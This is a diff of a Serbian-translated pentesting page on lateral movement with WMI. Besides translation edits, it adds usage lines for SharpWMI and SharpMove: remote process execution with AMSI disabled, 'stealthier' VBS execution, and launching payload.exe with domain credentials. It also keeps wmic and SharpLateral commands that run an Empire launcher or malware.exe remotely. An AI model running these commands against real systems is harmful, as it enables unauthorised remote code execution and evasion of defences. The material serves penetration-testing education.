@@ -12,7 +12,7 @@ Procesi se mogu otvoriti na hostovima gde su korisničko ime i ili lozinka ili h
 
 ### Namespace
 
-Strukturiran u hijerarhiji sličnoj direktorijumu, WMI-jev najviši kontejner je \root, pod kojim su organizovani dodatni direktorijumi, poznati kao namespaces.
+Strukturiran u hijerarhiji nalik direktorijumu, WMI-jev kontejner na vrhu je \root, pod kojim su organizovani dodatni direktorijumi, poznati kao namespaces.
 Komande za listanje namespaces:
 ```bash
 # Retrieval of Root namespaces
@@ -89,22 +89,38 @@ Daljinsko upitovanje WMI za specifične informacije, kao što su lokalni adminis
 
 ### **Ručno daljinsko WMI upitovanje**
 
-Diskretno identifikovanje lokalnih administratora na daljinskoj mašini i prijavljenih korisnika može se postići kroz specifične WMI upite. `wmic` takođe podržava čitanje iz tekstualne datoteke za izvršavanje komandi na više čvorova istovremeno.
+Diskretno identifikovanje lokalnih administratora na udaljenoj mašini i prijavljenih korisnika može se postići kroz specifične WMI upite. `wmic` takođe podržava čitanje iz tekstualne datoteke za izvršavanje komandi na više čvorova istovremeno.
 
-Da bi se daljinski izvršio proces preko WMI, kao što je implementacija Empire agenta, koristi se sledeća struktura komande, pri čemu uspešno izvršenje označava povratna vrednost "0":
+Da bi se daljinski izvršila proces preko WMI, kao što je implementacija Empire agenta, koristi se sledeća struktura komande, pri čemu uspešno izvršenje označava povratna vrednost "0":
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
 Ovaj proces ilustruje WMI-ovu sposobnost za daljinsko izvršavanje i enumeraciju sistema, ističući njenu korisnost kako za administraciju sistema, tako i za pentesting.
 
-## References
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
-
-## Automatic Tools
+## Automatski alati
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- Takođe možete koristiti **Impacketov `wmiexec`**.
+
+
+## Reference
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
